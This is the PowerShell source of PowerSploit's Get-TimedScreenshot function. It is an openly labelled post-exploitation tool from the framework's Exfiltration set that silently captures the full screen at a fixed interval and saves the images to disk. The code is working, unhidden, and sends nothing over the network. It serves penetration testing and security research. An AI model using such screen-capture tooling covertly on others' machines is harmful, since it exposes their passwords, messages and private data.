function Get-TimedScreenshot
{
<#
.SYNOPSIS

Takes screenshots at a regular interval and saves them to disk.

PowerSploit Function: Get-TimedScreenshot
Author: Chris Campbell (@obscuresec)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
    
.DESCRIPTION

A function that takes screenshots and saves them to a folder.

.PARAMETER Path

Specifies the folder path.
    
.PARAMETER Interval
    
Specifies the interval in seconds between taking screenshots.

.PARAMETER EndTime

Specifies when the script should stop running in the format HH-MM 

.EXAMPLE 

PS C:\> Get-TimedScreenshot -Path c:\temp\ -Interval 30 -EndTime 14:00 
 
.LINK

http://obscuresecurity.blogspot.com/2013/01/Get-TimedScreenshot.html
https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Get-TimedScreenshot.ps1
#>

    [CmdletBinding()] Param(
        [Parameter(Mandatory=$True)]             
        [Int32] $Interval, 

        [Parameter(Mandatory=$True)]             
        [ValidateScript({Test-Path -Path $_ })]
        [String] $Path,

        [Parameter(Mandatory=$True)]             
        [String] $EndTime    
    )

    #Define helper function that generates and saves screenshot
    Function Get-Screenshot {
       Set-Variable -Name ScreenBounds -Value ([Windows.Forms.SystemInformation]::VirtualScreen)

       Set-Variable -Name VideoController -Value (Get-WmiObject -Query 'SELECT VideoModeDescription FROM Win32_VideoController')

       if ($VideoController.VideoModeDescription -and $VideoController.VideoModeDescription -match '(?<ScreenWidth>^\d+) x (?<ScreenHeight>\d+) x .*$') {
           $Width = [Int] $Matches['ScreenWidth']
           $Height = [Int] $Matches['ScreenHeight']
       } else {
           Set-Variable -Name ScreenBounds -Value ([Windows.Forms.SystemInformation]::VirtualScreen)

           Set-Variable -Name Width -Value ($ScreenBounds.Width)
           Set-Variable -Name Height -Value ($ScreenBounds.Height)
       }

       Set-Variable -Name Size -Value (New-Object System.Drawing.Size($Width, $Height))
       Set-Variable -Name Point -Value (New-Object System.Drawing.Point(0, 0))

       Set-Variable -Name ScreenshotObject -Value (New-Object Drawing.Bitmap $Width, $Height)
       Set-Variable -Name DrawingGraphics -Value ([Drawing.Graphics]::FromImage($ScreenshotObject))
       $DrawingGraphics.CopyFromScreen($Point, [Drawing.Point]::Empty, $Size)
       $DrawingGraphics.Dispose()
       $ScreenshotObject.Save($FilePath)
       $ScreenshotObject.Dispose()
    }

    Try {
            
        #load required assembly
        Add-Type -Assembly System.Windows.Forms            

        Do {
            #get the current time and build the filename from it
            Set-Variable -Name Time -Value (Get-Date)
            
            [String] $FileName = "$($Time.Month)"
            Set-Variable -Name FileName -Value ($FileName + ('-'))
            Set-Variable -Name FileName -Value ($FileName + ("$($Time.Day)")) 
            Set-Variable -Name FileName -Value ($FileName + ('-'))
            Set-Variable -Name FileName -Value ($FileName + ("$($Time.Year)"))
            Set-Variable -Name FileName -Value ($FileName + ('-'))
            Set-Variable -Name FileName -Value ($FileName + ("$($Time.Hour)"))
            Set-Variable -Name FileName -Value ($FileName + ('-'))
            Set-Variable -Name FileName -Value ($FileName + ("$($Time.Minute)"))
            Set-Variable -Name FileName -Value ($FileName + ('-'))
            Set-Variable -Name FileName -Value ($FileName + ("$($Time.Second)"))
            Set-Variable -Name FileName -Value ($FileName + ('.png'))
            
            #use join-path to add path to filename
            [String] $FilePath = (Join-Path $Path $FileName)

            #run screenshot function
            Get-Screenshot
               
            Write-Verbose "Saved screenshot to $FilePath. Sleeping for $Interval seconds"

            Start-Sleep -Seconds $Interval
        }

        #note that this will run once regardless if the specified time as passed
        While ((Get-Date -Format HH:mm) -lt $EndTime)
    }

    Catch {Write-Error $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage}
}

